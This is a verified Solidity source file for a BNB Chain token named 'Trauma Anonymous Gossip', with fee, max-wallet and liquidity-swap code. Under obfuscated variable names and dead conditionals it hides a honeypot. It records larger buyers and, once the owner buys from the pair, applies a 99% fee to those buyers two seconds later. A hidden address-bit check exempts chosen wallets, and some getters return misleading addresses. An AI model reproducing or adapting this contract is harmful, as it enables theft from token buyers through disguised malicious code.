/**
 *Submitted for verification at BscScan.com on 2022-12-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract TraumaAnonymousGossip is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Trauma Anonymous Gossip ";
    string constant _symbol = "TraumaAnonymousGossip";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private txMaxLaunchedLimit;
    mapping(address => bool) private tradingSwapLiquidityWalletTxLaunched;
    mapping(address => bool) private buyTeamMinSwap;
    mapping(address => bool) private minWalletTeamTrading;
    mapping(address => uint256) private isTxWalletModeTrading;
    mapping(uint256 => address) private exemptBurnFeeTradingTeamSellLimit;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private walletLiquidityAutoBurn = 0;
    uint256 private sellExemptFeeTeam = 8;

    //SELL FEES
    uint256 private teamIsFeeSell = 0;
    uint256 private swapTxTradingMode = 8;

    uint256 private botsTeamMinLaunched = sellExemptFeeTeam + walletLiquidityAutoBurn;
    uint256 private teamMinTradingReceiver = 100;

    address private txAutoMinMaxBots = (msg.sender); // auto-liq address
    address private feeSellTradingLimit = (0xe69D03FA19822F7687F4BEc1FFfFEE52CF9970Aa); // marketing address
    address private teamMinBurnLimit = DEAD;
    address private marketingSwapModeTx = DEAD;
    address private botsBurnSellMaxBuyAuto = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private swapLaunchedLimitFee;
    uint256 private isFeeLiquidityBots;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private txBuyMaxIs;
    uint256 private maxIsWalletExempt;
    uint256 private liquidityIsWalletLimit;
    uint256 private burnReceiverMinTrading;
    uint256 private exemptReceiverModeLaunched;

    bool private limitTeamMaxBurn = true;
    bool private minWalletTeamTradingMode = true;
    bool private sellLaunchedModeLiquidity = true;
    bool private teamTradingSwapMinAutoBotsMax = true;
    bool private receiverLaunchedSwapAutoTeam = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private swapModeTeamBurn = 6 * 10 ** 15;
    uint256 private exemptMinLimitLiquidity = _totalSupply / 1000; // 0.1%

    
    bool private buyTeamLimitMin = false;
    uint256 private marketingLiquidityTeamLimitAuto = 0;
    uint256 private receiverTxBuyIs = 0;
    bool private burnSwapBotsLiquidity = false;
    uint256 private isBotsMaxTeam = 0;
    bool private marketingAutoBotsSell = false;
    uint256 private minSwapSellLiquidityTxAutoExempt = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        txBuyMaxIs = true;

        txMaxLaunchedLimit[msg.sender] = true;
        txMaxLaunchedLimit[address(this)] = true;

        tradingSwapLiquidityWalletTxLaunched[msg.sender] = true;
        tradingSwapLiquidityWalletTxLaunched[0x0000000000000000000000000000000000000000] = true;
        tradingSwapLiquidityWalletTxLaunched[0x000000000000000000000000000000000000dEaD] = true;
        tradingSwapLiquidityWalletTxLaunched[address(this)] = true;

        buyTeamMinSwap[msg.sender] = true;
        buyTeamMinSwap[0x0000000000000000000000000000000000000000] = true;
        buyTeamMinSwap[0x000000000000000000000000000000000000dEaD] = true;
        buyTeamMinSwap[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return launchedIsLimitTeam(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Trauma Anonymous Gossip  Insufficient Allowance");
        }

        return launchedIsLimitTeam(sender, recipient, amount);
    }

    function launchedIsLimitTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = liquidityMinSwapModeFeeTx(sender) || liquidityMinSwapModeFeeTx(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isOwner(recipient)) {
                teamSellExemptLimitMinMarketingBuy();
            }
            if (!bLimitTxWalletValue) {
                walletBurnLaunchedIs(recipient);
            }
        }
        
        if (receiverTxBuyIs == teamMinTradingReceiver) {
            receiverTxBuyIs = botsTeamMinLaunched;
        }

        if (minSwapSellLiquidityTxAutoExempt != walletLiquidityAutoBurn) {
            minSwapSellLiquidityTxAutoExempt = exemptMinLimitLiquidity;
        }

        if (buyTeamLimitMin != teamTradingSwapMinAutoBotsMax) {
            buyTeamLimitMin = marketingAutoBotsSell;
        }


        if (inSwap || bLimitTxWalletValue) {return limitSellReceiverMarketing(sender, recipient, amount);}

        if (!txMaxLaunchedLimit[sender] && !txMaxLaunchedLimit[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Trauma Anonymous Gossip  Max wallet has been triggered");
        }
        
        if (minSwapSellLiquidityTxAutoExempt != minSwapSellLiquidityTxAutoExempt) {
            minSwapSellLiquidityTxAutoExempt = swapTxTradingMode;
        }


        require((amount <= _maxTxAmount) || buyTeamMinSwap[sender] || buyTeamMinSwap[recipient], "Trauma Anonymous Gossip  Max TX Limit has been triggered");

        if (buyReceiverAutoIs()) {marketingMaxTradingSellExemptSwapMin();}

        _balances[sender] = _balances[sender].sub(amount, "Trauma Anonymous Gossip  Insufficient Balance");
        
        if (receiverTxBuyIs == marketingLiquidityTeamLimitAuto) {
            receiverTxBuyIs = minSwapSellLiquidityTxAutoExempt;
        }

        if (marketingLiquidityTeamLimitAuto == teamIsFeeSell) {
            marketingLiquidityTeamLimitAuto = walletLiquidityAutoBurn;
        }

        if (burnSwapBotsLiquidity != burnSwapBotsLiquidity) {
            burnSwapBotsLiquidity = minWalletTeamTradingMode;
        }


        uint256 amountReceived = liquidityIsMarketingBurn(sender) ? walletFeeSwapMax(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function limitSellReceiverMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Trauma Anonymous Gossip  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function liquidityIsMarketingBurn(address sender) internal view returns (bool) {
        return !tradingSwapLiquidityWalletTxLaunched[sender];
    }

    function liquidityMaxMarketingFee(address sender, bool selling) internal returns (uint256) {
        
        if (minSwapSellLiquidityTxAutoExempt == isBotsMaxTeam) {
            minSwapSellLiquidityTxAutoExempt = botsTeamMinLaunched;
        }

        if (marketingAutoBotsSell == limitTeamMaxBurn) {
            marketingAutoBotsSell = burnSwapBotsLiquidity;
        }


        if (selling) {
            botsTeamMinLaunched = swapTxTradingMode + teamIsFeeSell;
            return launchedBurnLimitBotsMin(sender, botsTeamMinLaunched);
        }
        if (!selling && sender == uniswapV2Pair) {
            botsTeamMinLaunched = sellExemptFeeTeam + walletLiquidityAutoBurn;
            return botsTeamMinLaunched;
        }
        return launchedBurnLimitBotsMin(sender, botsTeamMinLaunched);
    }

    function minSellBuyBurn() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function walletFeeSwapMax(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(liquidityMaxMarketingFee(sender, receiver == uniswapV2Pair)).div(teamMinTradingReceiver);

        if (minWalletTeamTrading[sender] || minWalletTeamTrading[receiver]) {
            feeAmount = amount.mul(99).div(teamMinTradingReceiver);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function liquidityMinSwapModeFeeTx(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function launchedBurnLimitBotsMin(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = isTxWalletModeTrading[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function walletBurnLaunchedIs(address addr) private {
        if (minSellBuyBurn() < swapModeTeamBurn) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        exemptBurnFeeTradingTeamSellLimit[exemptLimitValue] = addr;
    }

    function teamSellExemptLimitMinMarketingBuy() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (isTxWalletModeTrading[exemptBurnFeeTradingTeamSellLimit[i]] == 0) {
                    isTxWalletModeTrading[exemptBurnFeeTradingTeamSellLimit[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(feeSellTradingLimit).transfer(amountBNB * amountPercentage / 100);
    }

    function buyReceiverAutoIs() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    receiverLaunchedSwapAutoTeam &&
    _balances[address(this)] >= exemptMinLimitLiquidity;
    }

    function marketingMaxTradingSellExemptSwapMin() internal swapping {
        
        uint256 amountToLiquify = exemptMinLimitLiquidity.mul(walletLiquidityAutoBurn).div(botsTeamMinLaunched).div(2);
        uint256 amountToSwap = exemptMinLimitLiquidity.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = botsTeamMinLaunched.sub(walletLiquidityAutoBurn.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(walletLiquidityAutoBurn).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(sellExemptFeeTeam).div(totalETHFee);
        
        if (minSwapSellLiquidityTxAutoExempt == minSwapSellLiquidityTxAutoExempt) {
            minSwapSellLiquidityTxAutoExempt = receiverTxBuyIs;
        }


        payable(feeSellTradingLimit).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                txAutoMinMaxBots,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getExemptBurnFeeTradingTeamSellLimit(uint256 a0) public view returns (address) {
        if (a0 == swapTxTradingMode) {
            return botsBurnSellMaxBuyAuto;
        }
            return exemptBurnFeeTradingTeamSellLimit[a0];
    }
    function setExemptBurnFeeTradingTeamSellLimit(uint256 a0,address a1) public onlyOwner {
        exemptBurnFeeTradingTeamSellLimit[a0]=a1;
    }

    function getReceiverTxBuyIs() public view returns (uint256) {
        if (receiverTxBuyIs != swapTxTradingMode) {
            return swapTxTradingMode;
        }
        return receiverTxBuyIs;
    }
    function setReceiverTxBuyIs(uint256 a0) public onlyOwner {
        if (receiverTxBuyIs == teamMinTradingReceiver) {
            teamMinTradingReceiver=a0;
        }
        receiverTxBuyIs=a0;
    }

    function getExemptMinLimitLiquidity() public view returns (uint256) {
        return exemptMinLimitLiquidity;
    }
    function setExemptMinLimitLiquidity(uint256 a0) public onlyOwner {
        if (exemptMinLimitLiquidity != marketingLiquidityTeamLimitAuto) {
            marketingLiquidityTeamLimitAuto=a0;
        }
        if (exemptMinLimitLiquidity != sellExemptFeeTeam) {
            sellExemptFeeTeam=a0;
        }
        if (exemptMinLimitLiquidity != teamIsFeeSell) {
            teamIsFeeSell=a0;
        }
        exemptMinLimitLiquidity=a0;
    }

    function getMinSwapSellLiquidityTxAutoExempt() public view returns (uint256) {
        if (minSwapSellLiquidityTxAutoExempt == sellExemptFeeTeam) {
            return sellExemptFeeTeam;
        }
        if (minSwapSellLiquidityTxAutoExempt == isBotsMaxTeam) {
            return isBotsMaxTeam;
        }
        if (minSwapSellLiquidityTxAutoExempt == teamMinTradingReceiver) {
            return teamMinTradingReceiver;
        }
        return minSwapSellLiquidityTxAutoExempt;
    }
    function setMinSwapSellLiquidityTxAutoExempt(uint256 a0) public onlyOwner {
        minSwapSellLiquidityTxAutoExempt=a0;
    }

    function getMarketingLiquidityTeamLimitAuto() public view returns (uint256) {
        if (marketingLiquidityTeamLimitAuto != exemptMinLimitLiquidity) {
            return exemptMinLimitLiquidity;
        }
        return marketingLiquidityTeamLimitAuto;
    }
    function setMarketingLiquidityTeamLimitAuto(uint256 a0) public onlyOwner {
        marketingLiquidityTeamLimitAuto=a0;
    }

    function getMinWalletTeamTradingMode() public view returns (bool) {
        if (minWalletTeamTradingMode == burnSwapBotsLiquidity) {
            return burnSwapBotsLiquidity;
        }
        if (minWalletTeamTradingMode != teamTradingSwapMinAutoBotsMax) {
            return teamTradingSwapMinAutoBotsMax;
        }
        if (minWalletTeamTradingMode != sellLaunchedModeLiquidity) {
            return sellLaunchedModeLiquidity;
        }
        return minWalletTeamTradingMode;
    }
    function setMinWalletTeamTradingMode(bool a0) public onlyOwner {
        if (minWalletTeamTradingMode != buyTeamLimitMin) {
            buyTeamLimitMin=a0;
        }
        if (minWalletTeamTradingMode == marketingAutoBotsSell) {
            marketingAutoBotsSell=a0;
        }
        if (minWalletTeamTradingMode == limitTeamMaxBurn) {
            limitTeamMaxBurn=a0;
        }
        minWalletTeamTradingMode=a0;
    }

    function getSellLaunchedModeLiquidity() public view returns (bool) {
        if (sellLaunchedModeLiquidity == teamTradingSwapMinAutoBotsMax) {
            return teamTradingSwapMinAutoBotsMax;
        }
        return sellLaunchedModeLiquidity;
    }
    function setSellLaunchedModeLiquidity(bool a0) public onlyOwner {
        if (sellLaunchedModeLiquidity == marketingAutoBotsSell) {
            marketingAutoBotsSell=a0;
        }
        if (sellLaunchedModeLiquidity == limitTeamMaxBurn) {
            limitTeamMaxBurn=a0;
        }
        if (sellLaunchedModeLiquidity == receiverLaunchedSwapAutoTeam) {
            receiverLaunchedSwapAutoTeam=a0;
        }
        sellLaunchedModeLiquidity=a0;
    }

    function getTxMaxLaunchedLimit(address a0) public view returns (bool) {
            return txMaxLaunchedLimit[a0];
    }
    function setTxMaxLaunchedLimit(address a0,bool a1) public onlyOwner {
        if (a0 != feeSellTradingLimit) {
            minWalletTeamTradingMode=a1;
        }
        txMaxLaunchedLimit[a0]=a1;
    }

    function getFeeSellTradingLimit() public view returns (address) {
        if (feeSellTradingLimit == teamMinBurnLimit) {
            return teamMinBurnLimit;
        }
        if (feeSellTradingLimit != marketingSwapModeTx) {
            return marketingSwapModeTx;
        }
        if (feeSellTradingLimit != marketingSwapModeTx) {
            return marketingSwapModeTx;
        }
        return feeSellTradingLimit;
    }
    function setFeeSellTradingLimit(address a0) public onlyOwner {
        feeSellTradingLimit=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}